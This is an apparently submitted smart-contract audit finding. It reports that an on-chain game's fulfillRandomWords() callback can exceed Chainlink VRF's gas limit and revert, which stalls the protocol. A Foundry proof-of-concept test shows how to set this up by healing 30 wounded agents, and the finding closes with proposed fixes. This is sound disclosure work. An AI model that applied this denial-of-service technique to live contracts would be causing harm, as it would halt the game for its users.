# fulfillRandomWords() could revert under certain circumstances
## Summary

According the documentation of Chainlink VRF the max gas limit for the VRF coordinator is 2 500 000. This means that the max gas that fulfillRandomWords() can use is 2 500 000 and if it is exceeded the function would revert. I have constructed a proof of concept that demonstrates it is possible to have a scenario in which fulfillRandomWords reverts and thereby disrupts the protocol's work.

## Vulnerability Detail

Crucial part of my POC is the variable AGENTS_TO_WOUND_PER_ROUND_IN_BASIS_POINTS. I communicated with the protocol's team that they plan to set it to 20 initially but it is possible to have a different value for it in future. For the POC i used 30.

```solidity
function test_fulfillRandomWords_revert() public {
        _startGameAndDrawOneRound();

        _drawXRounds(48);
        
        uint256 counter = 0;
        uint256[] memory wa = new uint256[](30);
        uint256 totalCost = 0;

        for (uint256 j=2; j <= 6; j++) 
        {
            (uint256[] memory woundedAgentIds, ) = infiltration.getRoundInfo({roundId: j});

            uint256[] memory costs = new uint256[](woundedAgentIds.length);
            for (uint256 i; i < woundedAgentIds.length; i++) {
                costs[i] = HEAL_BASE_COST;
                wa[counter] = woundedAgentIds[i];
                counter++;
                if(counter > 29) break;
            }

            if(counter > 29) break;
        }
        
        
        totalCost = HEAL_BASE_COST * wa.length;
        looks.mint(user1, totalCost);

        vm.startPrank(user1);
        _grantLooksApprovals();
        looks.approve(TRANSFER_MANAGER, totalCost);


        infiltration.heal(wa);
        vm.stopPrank();

        _drawXRounds(1);
    }
```

I put this test into Infiltration.startNewRound.t.sol and used --gas-report to see that the gas used for fulfillRandomWords exceeds 2 500 000.

## Impact

DOS of the protocol and inability to continue the game.

## Tool used

Manual Review

## Recommendation

A couple of ideas : 

1) You can limit the value of AGENTS_TO_WOUND_PER_ROUND_IN_BASIS_POINTS to a small enough number so that it is 100% sure it will not reach the gas limit.

2) Consider simply storing the randomness and taking more complex follow-on actions in separate contract calls as stated in the "Security Considerations" section of the VRF's docs.
